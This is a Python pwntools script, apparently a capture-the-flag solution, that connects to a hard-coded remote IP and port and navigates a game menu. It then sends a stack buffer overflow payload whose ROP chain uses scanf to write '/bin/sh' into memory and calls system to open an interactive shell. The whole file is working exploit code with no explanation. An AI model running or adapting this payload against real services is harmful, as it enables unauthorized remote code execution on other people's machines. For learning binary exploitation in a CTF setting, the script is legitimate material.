```python
from pwn import *
ip='58.87.70.227'
port=10012
conn=remote(ip,port)


system_plt=0x4010E0
scanf_plt=0x401150
data_addr=0x404068
rdi_addr=0x4018c3
rsi_r15_addr=0x4018c1
_d_addr=0x40238A
ret_addr=0x40101a

payload1=b'a'*0x70+b'a'*0x8+p64(rdi_addr)+p64(_d_addr)+p64(rsi_r15_addr)+p64(data_addr)+p64(0)+p64(scanf_plt)+p64(rdi_addr)+p64(_d_addr)+p64(rsi_r15_addr)+p64(data_addr+4)+p64(0)+p64(scanf_plt)+p64(rdi_addr)+p64(data_addr)+p64(ret_addr)+p64(system_plt)

payload2=str(int.from_bytes(b'/bin','little')).encode()

payload3=str(int.from_bytes(b'/sh\x00','little')).encode()


while(1):
    conn.recvuntil(b'[ 2 ] Servant\n')
    conn.sendline(b'1')
    target_enemy=conn.recvuntil(b'STARTTTTTTT!\n')
    if b'BABYYY' in target_enemy:
        conn.sendline(b'1')
        conn.recvline()
        conn.sendline(b'1')
        conn.recvline()
    else:
        conn.sendline(b'2')
        conn.recvline()
        for i in range(6):
            conn.sendline(b'3')
            conn.recvline()
        conn.recvline()
        conn.sendline(payload1)
        conn.sendline(payload2)
        conn.sendline(payload3)
        conn.interactive()
        break

      



```
